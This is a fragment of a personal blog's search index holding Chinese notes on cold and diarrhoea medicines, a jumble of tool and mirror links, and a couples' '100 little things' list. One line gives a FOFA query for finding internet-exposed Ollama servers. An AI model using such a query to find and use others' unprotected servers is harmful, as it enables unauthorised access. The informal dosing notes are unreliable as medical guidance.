年轮 笛 三寸天堂 弱水三千 笛\nERR 病毒性咳嗽 阿斯美 苏黄止咳 小葵花止咳\n病毒性腹泻 补液比止泻更重要 口服补液盐 Ⅲ：这是治疗病毒性腹泻的 “基础用药”，能补充腹泻丢失的水分、电解质（钠、钾、氯），预防或纠正轻中度脱水。 用法：按说明书比例冲调（通常 1 袋冲 100-250ml 温水），少量多次服用，成人每次腹泻后喝 100-150ml，婴幼儿按体重计算（每日 50-100ml/kg），直到腹泻、呕吐停止。 注意：不要用牛奶、果汁或糖水稀释，以免影响电解质平衡；若呕吐严重无法口服，需及时就医静脉补液。\n蒙脱石散： 用温水冲调后空腹服用，与其他药物间隔 1-2 小时 益生菌制剂（如双歧杆菌、布拉氏酵母菌散） 避免与蒙脱石散同时吃（间隔 1-2 小时）\n","permalink":"https://qfsyso.github.io/posts/some-code/","summary":"now study 开发者活动 https://developer.huaweicloud.com/events\n云学堂 https://edu.huaweicloud.com/signup/a84b127961f4408bb69d560f48c5675d\n华为云认证 https://edu.huaweicloud.com/certificationindex\n开发者空间学习 https://developer.huaweicloud.com/space/devportal/knowledge\nhttps://linux.do/t/topic/665547/1 华为云认真攻略\nAES-256 加密算法和三重转轮混淆技术\n10个人 2m 100 20m\n瘦肚子 胯下击掌 50 单侧提膝 50 提膝下压 50 深蹲 30 4组\nsomething git github镜像网站入口1：https://bgithub.xyz/ github镜像网站入口3：https://kkgithub.com/ github镜像网站入口5：https://gitclone.com/ github镜像网站入口6：https://g.nite07.org https://github.cmliussss.net/\nchatbox https://github.com/Bin-Huang/chatbox Desktop Client App for AI Models/LLMs (GPT, Claude, Gemini, Ollama\u0026hellip;)\nfofa https://fofa.info/ app=\u0026ldquo;Ollama\u0026rdquo; \u0026amp;\u0026amp; is_domain=false https://github.com/ollama/ollama/blob/main/docs/api.md\ndbeaver sql工具 https://github.com/dbeaver/dbeaver/releases\nsing-boxyg https://github.com/yonggekkk/sing-box-yg\nmusic-desktop https://github.com/lyswhut/lx-music-desktop\nRDP、VNC、SSH 远程 https://github.com/mRemoteNG/mRemoteNG\ngeekgeekrun https://github.com/geekgeekrun/geekgeekrun\nclash linux https://github.com/Elegycloud/clash-for-linux-backup\nssh https://github.com/cmliu/webssh https://github.","title":"some code"},{"content":"\n手牵手逛街 一起看海 一起看雪 喂我吃东西 一起堆雪人 一起坐摩天轮 一起恶作剧 一起坐海盗船 吃同一杯冰淇淋 一起搬东西 一起布置我们的小窝 一起看日出 一起看恐怖片 送惊喜小礼物 为我做顿饭 一起看爱情片 一起看日落 一起数星星 一起洗衣服 一起听同一首曲子 在朋友面前介绍我 把肩膀借给我靠 为我擦眼泪 唱歌给我听 为我写篇日记 在大街上背我 随叫随到 一起看球赛 比赛啃西瓜 在沙滩上画心 一起没形象的大叫 一起熬夜玩游戏 为我系鞋带 一起拉粑 一起发呆 一起过我们的纪念日 一起做陶瓷 一起许愿 一起做蛋糕 学对方说话 一起模仿搞笑的事情 为我剪指甲 吃我剩下的饭饭 把你欺负的对我没辙 一起打水仗 一起拍照片 一起骑脚踏车 戴同一条围巾 戴同一双手套 讲故事哄我睡觉 一起吃棉花糖 一起唱歌 一起淋雨 一起面对所有难堪 一起爬山 一起露营 一起跑步 一起傻笑 一起吃路边摊 一起去猫咖 穿情侣装显摆 一起打羽毛球 一起吃爱吃的东西到吐 一起踩马路到脚软 一起去旅行 一起去动物园 咬一下你的脸颊 对我说晚安 一起看电影 一起买菜 比赛石头剪刀布 一起见对方的朋友 一起做鬼脸 一起走遍世界各地 一起吃大餐，牵手进去，扶墙出来 一起扎气球赢奖品 站在马路的两侧大喊 看你打场比赛 一起看演唱会 一起沿铁轨 一起坐地铁 一起放风筝 一起看花田 趁你睡觉偷亲你一下 一起放孔明灯 一起钓鱼 一起下棋 一起在烈日下暴晒 手机屏保设置对方的照片 一起敷面膜 一起捏对方的脸 打赌各种各样的事 一起看烟火 在树下埋下我们的约定 去海边放漂流瓶 拍一次婚纱照 求婚 结婚 完成人生各项大事 白头偕老 ","permalink":"https://qfsyso.github.io/posts/100%E4%BB%B6%E5%B0%8F%E4%BA%8B/","summary":"\n手牵手逛街 一起看海 一起看雪 喂我吃东西 一起堆雪人 一起坐摩天轮 一起恶作剧 一起坐海盗船 吃同一杯冰淇淋 一起搬东西 一起布置我们的小窝 一起看日出 一起看恐怖片 送惊喜小礼物 为我做顿饭 一起看爱情片 一起看日落 一起数星星 一起洗衣服 一起听同一首曲子 在朋友面前介绍我 把肩膀借给我靠 为我擦眼泪 唱歌给我听 为我写篇日记 在大街上背我 随叫随到 一起看球赛 比赛啃西瓜 在沙滩上画心 一起没形象的大叫 一起熬夜玩游戏 为我系鞋带 一起拉粑 一起发呆 一起过我们的纪念日 一起做陶瓷 一起许愿 一起做蛋糕 学对方说话 一起模仿搞笑的事情 为我剪指甲 吃我剩下的饭饭 把你欺负的对我没辙 一起打水仗 一起拍照片 一起骑脚踏车 戴同一条围巾 戴同一双手套 讲故事哄我睡觉 一起吃棉花糖 一起唱歌 一起淋雨 一起面对所有难堪 一起爬山 一起露营 一起跑步 一起傻笑 一起吃路边摊 一起去猫咖 穿情侣装显摆 一起打羽毛球 一起吃爱吃的东西到吐 一起踩马路到脚软 一起去旅行 一起去动物园 咬一下你的脸颊 对我说晚安 一起看电影 一起买菜 比赛石头剪刀布 一起见对方的朋友 一起做鬼脸 一起走遍世界各地 一起吃大餐，牵手进去，扶墙出来 一起扎气球赢奖品 站在马路的两侧大喊 看你打场比赛 一起看演唱会 一起沿铁轨 一起坐地铁 一起放风筝 一起看花田 趁你睡觉偷亲你一下 一起放孔明灯 一起钓鱼 一起下棋 一起在烈日下暴晒 手机屏保设置对方的照片 一起敷面膜 一起捏对方的脸 打赌各种各样的事 一起看烟火 在树下埋下我们的约定 去海边放漂流瓶 拍一次婚纱照 求婚 结婚 完成人生各项大事 白头偕老 ","title":"100件小事"}]